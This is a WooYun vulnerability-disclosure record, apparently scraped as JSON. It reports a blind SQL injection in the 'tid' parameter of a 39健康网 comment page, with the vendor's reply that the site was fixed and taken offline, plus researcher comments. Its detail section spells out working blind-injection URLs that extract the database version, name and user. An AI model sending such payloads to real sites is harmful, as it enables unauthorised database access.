{"id": 3696, "wybug_id": "wooyun-2014-064000", "wybug_title": "39健康网某站点存在SQL盲注漏洞", "wybug_corp": "39健康网", "wybug_author": "梧桐雨", "wybug_date": "2014-06-07 23:39", "wybug_open_date": "2014-06-09 14:08", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： MSSQL SQL盲注入 详细说明：  存在注入的站点如下：http://makemoney.39.net/\n\n注入页面：CommentPager.ashx注入参数：tid正常情况：\n\nand 1=1and 1=2返回结果不一：\n\n\n\n嗯，用substring()函数来进行盲注吧。http://makemoney.39.net/CommentPager.ashx?tid=1%20and%20substring((select%20@@version),22,4)=%272005%27返回正常，说明mssql是2005的：\n\n接下来猜database:http://makemoney.39.net/CommentPager.ashx?tid=1%20and%20substring((select%20db_name()),1,1)=%27A%27返回错误http://makemoney.39.net/CommentPager.ashx?tid=1%20and%20substring((select%20db_name()),1,1)=%27C%27返回正常，说明数据库第一个字符是C以此类推：得database = Comment   漏洞证明：  试试注入user吧。http://makemoney.39.net/CommentPager.ashx?tid=1%20and%20substring((select%20user),1,1)=%27a%27返回错误http://makemoney.39.net/CommentPager.ashx?tid=1%20and%20substring((select%20user),1,1)=%273%27返回正常，以此类推得：39_Comment当前权限：DB_OWNER    修复方案：  过滤。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-06-09 14:07 厂商回复： 感谢梧桐雨的辛勤劳动！ 最新状态： 2014-06-09：此站已经处于停滞状态，无人跟进，已经将站点下线 2014-06-09：已修复  ", "replys": "漏洞评价：\n评论\n     2014-06-07 23:47 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:471 漏洞数:110        | X)\t\t \n  妹子早点睡    \n     2014-06-08 00:06 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  妹子熬夜对皮肤不好    \n     2014-06-08 00:23 |    \t\tabcdlzy \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:14        | 好好学习，天天向上。)\t\t \n  挖39一般是查某些东西顺手的0x0    \n     2014-06-08 12:42 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @abcdlzy 机智~    \n     2014-07-22 12:16 |    \t\tcunzhangok \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | kail)\t\t \n  希望这个过程，手动注入才有意思    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}